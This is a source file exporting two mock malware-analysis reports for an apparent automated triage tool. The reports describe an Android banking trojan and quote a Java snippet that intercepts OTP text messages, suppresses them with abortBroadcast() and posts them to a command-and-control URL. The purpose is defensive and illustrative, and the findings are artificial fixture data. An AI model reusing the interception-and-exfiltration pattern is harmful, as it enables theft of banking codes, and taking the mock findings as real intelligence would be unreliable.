export const MOCK_EXECUTIVE_REPORT = `# Executive Triage Summary: Nerve Security Assessment

**Target Package:** \`com.bank.secure.auth\`  
**Assessed Version:** \`v4.2.0-release\`  
**Risk Score:** \`0.94 / 1.00 (Likely Malicious)\`  
**Verdict:** 🚨 **CRITICAL THREAT — BANKING TROJAN DETECTED**

---

### Executive Overview
The Nerve Autonomous Multi-Agent Triage System evaluated package \`com.bank.secure.auth\` against deterministic static indicators, decompiled source trees, threat intelligence registries, and adversarial verification.

The application masquerades as a multi-factor authentication banking utility while embedding an active SMS interception Trojan with exfiltration capabilities directed at known C2 infrastructure ([E-A-0004]).

### Key Verified Findings
1. **Stealth SMS Interception with Priority 999:**
   The application registers a high-priority broadcast receiver configured to intercept incoming SMS messages ([E-A-0001]) and calls \`abortBroadcast()\` ([E-A-0002]) to silently suppress inbound banking verification codes and OTPs from the victim's notification center.
2. **Exfiltration of Financial One-Time Passcodes:**
   Decompiled Java call chains confirm matching of incoming SMS payloads against banking patterns (\`OTP\`, \`PIN\`, \`token\`) and automated HTTP POST dispatch to malicious C2 infrastructure ([E-A-0002]).
3. **Malware Signature & IOC Correlation:**
   Threat intelligence matching correlated the binary against YARA signature \`Android_Banker_SmsStealer\` ([E-A-0003]) and confirmed blacklisted domain \`auth-sync.api-telemetry.cc\` ([E-A-0004]).
4. **Adversarial Resilience:**
   The package attempted a covert prompt injection bypass via localized XML resources ([E-A-0005]); Nerve's Input Sanitizer detected and neutralized the exploit before LLM inference.

### Recommended Immediate Actions
- **Revoke and Block:** Block network communication with \`*.api-telemetry.cc\` at the perimeter firewall and MDM agents.
- **Enterprise Alert:** Quarantine devices exhibiting SHA-256 hash \`3e6f6b538b82874dd94c0d8cdadd69ba54d49b59d2c7eb055073892e8a4fc0e0\`.
- **Credential Cycling:** Force password and MFA token resets for any accounts accessed from infected endpoints.
`;

export const MOCK_TECHNICAL_REPORT = `# Technical Forensics & Reverse Engineering Report

**Artifact Hash:** \`3e6f6b538b82874dd94c0d8cdadd69ba54d49b59d2c7eb055073892e8a4fc0e0\`  
**Package Name:** \`com.bank.secure.auth\`  
**Analysis Engine:** \`Nerve LangGraph v2.4 (8 Agents)\`  
**Determinism:** \`Noisy-OR Bayesian Aggregation (Score: 0.941)\`

---

## 1. Attack Graph & Decompiled Forensics

### 1.1 Broadcast Receiver Registration
Static inspection of \`AndroidManifest.xml\` uncovered intent-filter priority manipulation:
\`\`\`xml
<!-- Citation [E-A-0001] -->
<receiver android:name=".receivers.SmsInterceptor"
    android:permission="android.permission.BROADCAST_SMS"
    android:priority="999"
    android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
    </intent-filter>
</receiver>
\`\`\`

### 1.2 Call Path Tracing & Data Exfiltration
Reverse engineering decompilation identified the following payload extraction routine in \`SmsInterceptor.java\` ([E-A-0002]):
\`\`\`java
if (body.matches(".*(code|OTP|PIN|verification|token).*")) {
    abortBroadcast(); // Prevents user notification
    C2Client.dispatchTelemetry("https://auth-sync.api-telemetry.cc/gate", sender, body);
}
\`\`\`
The \`abortBroadcast()\` invocation guarantees exclusive interception of OTP codes before default SMS handlers process the intent.

## 2. Threat Intel & Network Infrastructure
- **C2 Domain:** \`auth-sync.api-telemetry.cc\` ([E-A-0004])
- **Resolved IPs:** \`185.220.101.5\`, \`185.220.101.7\`
- **YARA Rule Match:** \`Android_Banker_SmsStealer\` ([E-A-0003])
- **MITRE ATT&CK Matrix:**
  - \`T1412\`: SMS Delivery & Interception
  - \`T1437\`: Application Layer Protocol Command & Control
  - \`T1629.001\`: Adversarial Evasion via Prompt Injection ([E-A-0005])

## 3. Adversarial Verification Summary
All 4 primary findings underwent cross-examination by the **Verifier Agent**:
- **Claim: SMS Interception:** Verified with decompiled evidence ([E-A-0001], [E-A-0002]).
- **Claim: Exfiltration to C2:** Verified with live network dispatch trace ([E-A-0002], [E-A-0004]).
- **Claim: Banking Trojan Signature:** Verified against YARA rule database ([E-A-0003]).
- **Claim: Benign Telemetry (Refuted):** The app author's claim that traffic is diagnostic telemetry was **Contradicted** due to \`abortBroadcast()\` usage.
`;
